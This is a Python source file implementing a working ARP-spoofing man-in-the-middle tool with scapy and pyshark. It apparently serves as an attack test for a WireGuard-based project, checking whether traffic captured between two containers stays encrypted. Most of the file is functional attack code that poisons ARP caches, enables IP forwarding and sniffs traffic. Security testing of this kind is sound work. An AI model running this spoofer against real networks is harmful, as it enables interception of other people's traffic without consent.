# This code is inspired by (visited at 15.11.2021):
#  https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
# TODO: Info that this is an offensive script,
#  only use in LAN where you allowed to us such SW

import time
import os
import sys
import subprocess
import platform
import logging
import click
import json

from threading import Timer
from pyfiglet import Figlet
from printy import printy
from scapy.all import Ether, ARP, srp, send
from ipaddress import IPv4Address
import pyshark

# TODO issues
#       * 1st run always fails -> network not ready?
#       * ARP spoofing does not work always -> restore fail? other?
#           * Current Workaround: detect error and give a specific
#             error message
#       * Solve Threading issues (or remove comments)
# TODO (minor):
#       * black, flake8, isort, mypy


# TODO: Make configurable in the future (e.g stream vs file handler)
logger = logging.getLogger("arp-spoofer")
logger.setLevel(logging.DEBUG)

handler = logging.StreamHandler(sys.stdout)
# handler = logging.FileHandler('file.log')
handler.setLevel(logging.DEBUG)
formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
handler.setFormatter(formatter)
logger.addHandler(handler)

TEST_PASSED_STAMP = "./podman/.test-passed-stamp"
TEST_NOT_PASSED_STAMP = "./podman/.test-not-passed-stamp"
NO_CAPTURE = "./podman/.test-no-capture"


def _enable_macos_iproute():
    """
    Enables IP route ( IP Forward ) in MacOS
    :return: Nothing
    """
    # This command needs root rights!
    cmd = "sysctl net.inet.ip.forwarding=1"
    subprocess.Popen(cmd.split(' '))


def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro

    Note: This does not work in containers.
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(file_path, "w") as f:
        f.write("1")


def _enable_windows_iproute():
    """
    Enables IP route (IP Forwarding) in Windows
    """
    from services import WService

    # enable Remote Access service
    service = WService("RemoteAccess")
    service.start()


def enable_ip_route():
    """
    Enables IP forwarding
    """
    logger.debug("[*] Getting underlying system...")
    # TODO: Use platform.system() for all platforms.
    platform_name: str = platform.system()
    logger.debug(f"[*] Platform found: {platform_name}")

    if platform_name.lower() == 'darwin':
        logger.info("[*] Enabling IP routing on MacOS...")
        _enable_macos_iproute()
    elif "nt" in os.name:
        logger.info("[*] Enabling IP routing on Windows...")
        _enable_windows_iproute()
    else:
        logger.info("[*] Enabling IP routing on Linux...")
        _enable_linux_iproute()

    logger.info("[+] IP Routing enabled.")


def get_mac(ip: IPv4Address) -> str:
    """
    Returns MAC address belonging to the given IP address within the network.
    Returns None if nothing was found.

    :param ip: IPv4 address as string
    :return:
    """
    logger.debug(f"Getting MAC for IP: {ip}")
    # srp sends ARP request and listens for any response
    ans, _ = srp(
        Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip), timeout=3, verbose=0
    )
    if ans:
        mac = ans[0][1].src
        logger.debug(f"Found MAC for IP: {mac}")
        return mac


def spoof(target_ip, host_ip):
    """
    Spoofs target_ip saying that we are host_ip (poisoning the targets cache).

    :param target_ip: IPv4 address as string
    :param host_ip: IPv4 address as string
    :return:
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    logger.debug(f"MAC for target: {target_mac}")

    # Get own mac address
    own_mac = ARP().hwsrc
    logger.debug(f"Our MAC: {own_mac}")

    # Create a 'is-at' operation ARP package (malicious ARP reply).
    # An ARP response we send to the target
    #  saying our mac address belongs to the hosts ip
    arp_response = ARP(
        pdst=target_ip,
        hwdst=target_mac,
        hwsrc=own_mac,
        psrc=host_ip,
        op='is-at',
    )

    # send the packet
    send(arp_response, verbose=0)

    logger.debug(f"[+] Sent to {target_ip} : {host_ip} is-at {own_mac}")


def restore(target_ip, host_ip):
    """
    Restores the normal process of a regular network
    This is done by sending the original information
    (real IP and MAC of `host_ip` ) to `target_ip`

    :param target_ip: IPv4 address as string
    :param host_ip: IPv4 address as string
    :return:
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)

    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)

    # crafting the restoring packet
    arp_response = ARP(
        pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac
    )

    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)

    logger.info(f"[+] Sent to {target_ip} : {host_ip} is-at {host_mac}")


def capture(timeout: int) -> None:
    """
    :param timeout: How long the traffic shall be captured.
    :return:
    """
    WIREGUARD_TSHARK_STRING = "WG"

    click.echo("[+] Start sniffing...")
    cap = pyshark.LiveCapture(interface="eth0")
    cap.sniff(timeout=timeout)
    packets = [pkt for pkt in cap._packets]
    cap.close()

    wg_count = 0
    for pkt in packets:
        if pkt.highest_layer == WIREGUARD_TSHARK_STRING:
            wg_count += 1

    if wg_count > 0:
        with open(TEST_PASSED_STAMP, "w") as f:
            f.write(str(wg_count))
    elif len(packets) == 0:
        with open(NO_CAPTURE, "w") as f:
            f.write(str(wg_count))
    else:
        with open(TEST_NOT_PASSED_STAMP, "w") as f:
            f.write(str(wg_count))

    click.echo("[+] Stop sniffing")


@click.group()
def main_cli():
    pass


@main_cli.command()
@click.argument('name', type=str)
def banner(name: str):
    f = Figlet()
    printy(f.renderText(f"It's a me {name}!"), 'o>')
    print()
    print("[+]", end=" ")
    printy("Start attack test", 'n')
    print()


@main_cli.command()
def activeresult():
    # Get Mallorys IP
    cmd_mallory_podman = ["sudo", "podman", "inspect", "mallory"]
    p_mallory = subprocess.Popen(
        cmd_mallory_podman, stdout=subprocess.PIPE, universal_newlines=True
    )
    mallory_output = p_mallory.communicate()[0]
    out_json = json.loads(mallory_output)
    ip_mallory = out_json[0]["NetworkSettings"]["IPAddress"]

    # Check if mallory's IP is in target peer output
    cmd_target_podman = [
        "sudo",
        "podman",
        "exec",
        "vula-bullseye-test2",
        "vula",
        "peer",
    ]
    p_target = subprocess.Popen(
        cmd_target_podman, stdout=subprocess.PIPE, universal_newlines=True
    )
    target_output = p_target.communicate()[0]

    if ip_mallory in target_output:
        print("[+]", end=" ")
        printy(f"Test passed! Targets poisoned with {ip_mallory}", 'n')
    else:
        print("[!]", end=" ")
        printy("Test failed! Targets not poisoned", 'r>')
        print("Try running the test again, poisoning is currently not stable")


@main_cli.command()
def result():
    if os.path.exists(TEST_PASSED_STAMP):
        os.unlink(TEST_PASSED_STAMP)
        print()
        print("[+]", end=" ")
        printy("Test passed!", 'n')
        print("Communcation is encrypted")
        print()
    elif os.path.exists(NO_CAPTURE):
        os.unlink(NO_CAPTURE)

        print("[!]", end=" ")
        printy("Could not capture any traffic!", 'o>')
        print("Please clean test setup and restart test")
        print()
    else:
        os.unlink(TEST_NOT_PASSED_STAMP)
        print("[!]", end=" ")
        printy("Test failed!", 'r>')
        print("Communcation is NOT encrypted")
        print()


@main_cli.command()
@click.argument('target_ip1', type=str)
@click.argument('target_ip2', type=str)
@click.argument('capture_time', type=int)
@click.argument('is_test', default=False, type=bool)
def run(
    target_ip1: str, target_ip2: str, capture_time: int, is_test: bool = False
):

    if not is_test:
        # Only execute if the script is NOT executed in a container.
        # enable ip forwarding
        enable_ip_route()

    # Clears test stamp if present
    if os.path.exists(TEST_PASSED_STAMP):
        os.unlink(TEST_PASSED_STAMP)
    if os.path.exists(TEST_NOT_PASSED_STAMP):
        os.unlink(TEST_NOT_PASSED_STAMP)
    if os.path.exists(NO_CAPTURE):
        os.unlink(NO_CAPTURE)
    # Run capturing in different thread since it's blocking
    # Add a few seconds delay in order to spoof before start capturing
    capture_thread = Timer(interval=3, function=capture, args=[capture_time])
    capture_thread.start()

    # # Send malicious packages every second
    try:
        while capture_thread.is_alive():
            # telling the target1 that we are the target2
            spoof(target_ip1, target_ip2)
            # telling the target2 that we are the target1
            spoof(target_ip2, target_ip1)

            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        # Restore even the user terminates the process
        pass
        # Restore the network to the legit state
        restore(target_ip1, target_ip2)
        restore(target_ip2, target_ip1)

        # TODO: Force it to quit? With timeout?
        #  Keep it as it is? Before or after restore?
        # Wait for the sniffing to be completed
        capture_thread.join()


if __name__ == '__main__':
    main_cli()
